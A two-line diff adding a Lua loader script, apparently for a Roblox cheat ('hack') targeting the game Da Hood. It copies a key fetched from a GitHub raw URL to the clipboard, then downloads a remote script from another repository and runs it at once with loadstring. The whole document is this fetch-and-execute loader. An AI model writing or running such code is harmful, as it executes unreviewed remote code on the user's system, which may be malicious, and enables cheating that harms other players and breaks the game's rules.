@@ -1,0 +1,2 @@
+setclipboard(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/Krampus/main/Da-Hood/__key")) -- Gets the key for the hack
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Compwnter/LegacyX/main/script.lua'), true))()
